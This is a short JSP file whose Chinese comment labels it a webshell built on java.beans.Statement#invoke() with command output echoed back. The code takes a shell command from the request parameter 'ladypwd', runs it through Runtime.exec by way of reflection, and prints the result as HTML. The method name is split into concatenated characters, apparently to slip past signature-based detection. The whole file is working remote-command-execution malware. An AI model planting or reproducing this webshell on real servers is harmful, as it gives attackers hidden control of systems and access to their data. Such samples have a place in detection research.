<%@ page import="java.beans.Statement" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
使用Statement#invoke() 实现JSP Webshell
PS: 这种实现方式有命令回显
--%>
<%
    String cmd = request.getParameter("ladypwd");
    Statement stmt = new Statement(Runtime.getRuntime(), "e"+"x"+"e"+"c", new Object[]{cmd});
    Method m = Statement.class.getDeclaredMethod("invoke");
    m.setAccessible(true);
    Process p = (Process) m.invoke(stmt);
    InputStream is = p.getInputStream();
    StringBuilder sb = new StringBuilder();
    BufferedReader br = new BufferedReader(new InputStreamReader(is));
    String line;
    while((line = br.readLine()) != null) {
        sb.append(line).append("\n");
    }
    out.print("<pre>");
    if (sb.length() > 0) {
        out.print(sb.toString());
    }
    out.print("</pre>");
%>
